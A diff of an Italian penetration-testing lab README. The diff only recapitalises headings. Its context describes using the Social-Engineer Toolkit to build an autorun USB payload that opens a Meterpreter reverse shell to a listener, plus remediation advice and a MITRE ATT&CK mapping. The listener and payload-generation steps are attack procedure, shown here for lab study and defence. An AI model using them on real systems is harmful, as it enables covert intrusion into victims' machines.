@@ -1,6 +1,6 @@
 > [English](README.en.md) | **Italiano**
 
-# SET Infectious Media Generator: Autorun USB Payload
+# SET infectious media generator: autorun USB payload
 
 > - **Fase:** Social Engineering - Infectious Media Generator - Physical Access Vector
 > - **Visibilita:** Media - l'inserimento USB viene registrato nei log di sistema (Event ID 6416 per PnP); l'esecuzione del payload puo triggerare AV/EDR; nessun traffico di rete nella fase di delivery (consegna fisica)
@@ -14,7 +14,7 @@
 
 ---
 
-## Executive Summary
+## Executive summary
 
 L'Infectious Media Generator di SET automatizza la creazione di payload per supporti rimovibili (USB drive) con configurazione autorun. La tecnica sfrutta il meccanismo AutoRun/AutoPlay di Windows per eseguire automaticamente un payload al mount del dispositivo USB. Sebbene AutoRun sia disabilitato di default a partire da Windows 7 SP1 (Microsoft Security Advisory 967940), la tecnica resta rilevante in tre contesti: ambienti legacy (Windows XP/7 non aggiornati, sistemi industriali SCADA/ICS), ambienti con policy GPO che riabilitano AutoRun, e scenari in cui l'ingegneria sociale convince l'utente ad aprire manualmente il file.
 
@@ -22,7 +22,7 @@ Nel laboratorio e stata generata la struttura autorun (file `autorun.inf` + payl
 
 ---
 
-## Finding SE-005: Payload Autorun su Supporto USB
+## Finding SE-005: payload autorun su supporto USB
 
 **ID Finding:** `SE-005` | **Severity:** `Medio` | **CVSS:** 5.3
 
@@ -30,7 +30,7 @@ Un attaccante con accesso fisico all'area target puo depositare un supporto USB 
 
 **Scenario PoC:** L'analista genera tramite SET una struttura autorun con payload Meterpreter, la copia su un drive USB e la inserisce nella VM Windows 7 target. L'autorun esegue il payload e stabilisce una reverse shell.
 
-### PoC - Fase 1: Setup del Listener
+### PoC - fase 1: setup del listener
 
 ```Bash
 msfconsole -q
@@ -46,7 +46,7 @@ exploit -j
 [*] Started reverse TCP handler on 192.168.0.110:4445                <--
 ```
 
-### PoC - Fase 2: Generazione Payload con SET
+### PoC - fase 2: generazione payload con SET
 
 ```Bash
 sudo setoolkit
@@ -91,7 +91,7 @@ set:infectious> 1
 [*] Copy the contents of /root/.set/autorun/ to your USB drive.
 ```
 
-### PoC - Fase 3: Analisi della Struttura Generata
+### PoC - fase 3: analisi della struttura generata
 
 ```Bash
 cat /root/.set/autorun/autorun.inf
@@ -116,7 +116,7 @@ drwxr-xr-x 5 root root  4096 Mar 28 15:10 ..
 -rwxr-xr-x 1 root root 73802 Mar 28 15:10 payload.exe              <--
 ```
 
-### PoC - Fase 4: Copia su USB e Test su Target
+### PoC - fase 4: copia su USB e test su target
 
 I file vengono copiati sul drive USB (montato su Kali come `/media/usb`).
 
@@ -139,7 +139,7 @@ Server username: WIN7-LAB\utente                                     <--
 
 ---
 
-## Impatto e Remediation (Blue Team)
+## Impatto e remediation (blue team)
 
 L'esecuzione di payload tramite supporto USB fornisce all'attaccante accesso al sistema target senza alcuna interazione di rete nella fase di delivery. Il vettore fisico bypassa completamente i controlli perimetrali (firewall, email gateway, proxy).
 
@@ -153,7 +153,7 @@ L'esecuzione di payload tramite supporto USB fornisce all'attaccante accesso al 
 
 ---
 
-## Esperienza di Laboratorio
+## Esperienza di laboratorio
 
 L'ambiente di test ha richiesto una configurazione specifica: la VM Windows 10 di laboratorio aveva AutoRun disabilitato di default, rendendo impossibile l'esecuzione automatica. Per testare la tecnica nella sua forma originale e stato necessario utilizzare una VM Windows 7 con AutoRun abilitato.
 
@@ -167,7 +167,7 @@ Un'osservazione importante: in un engagement reale moderno, l'attaccante non use
 
 ---
 
-## Analisi Teorica: Vettore Fisico e Ingegneria Sociale
+## Analisi teorica: vettore fisico e ingegneria sociale
 
 L'attacco via media rimovibili sfrutta due vulnerabilita distinte:
 
@@ -185,11 +185,11 @@ La severity Medio riflette il requisito di accesso fisico e la disabilitazione d
 
 ## Mappatura MITRE ATT&CK
 
-| Tattica | Tecnica | ID MITRE | Descrizione dell'Azione |
+| tattica | tecnica | id mitre | descrizione dell'azione |
 | :--- | :--- | :--- | :--- |
-| Resource Development | Obtain Capabilities: Tool | `T1588.002` | Utilizzo di SET per la generazione automatica del payload e del file autorun.inf per supporto USB. |
-| Initial Access | Replication Through Removable Media | `T1091` | Payload consegnato tramite chiavetta USB depositata nell'area target; esecuzione automatica via AutoRun o manuale via ingegneria sociale. |
-| Execution | User Execution: Malicious File | `T1204.002` | Su sistemi senza AutoRun, la vittima apre manualmente il file payload indotta dall'etichettatura ingannevole del dispositivo. |
+| resource development | obtain capabilities: tool | `T1588.002` | utilizzo di set per la generazione automatica del payload e del file autorun.inf per supporto usb. |
+| initial access | replication through removable media | `T1091` | payload consegnato tramite chiavetta usb depositata nell'area target; esecuzione automatica via autorun o manuale via ingegneria sociale. |
+| execution | user execution: malicious file | `T1204.002` | su sistemi senza autorun, la vittima apre manualmente il file payload indotta dall'etichettatura ingannevole del dispositivo. |
 
 ---
 
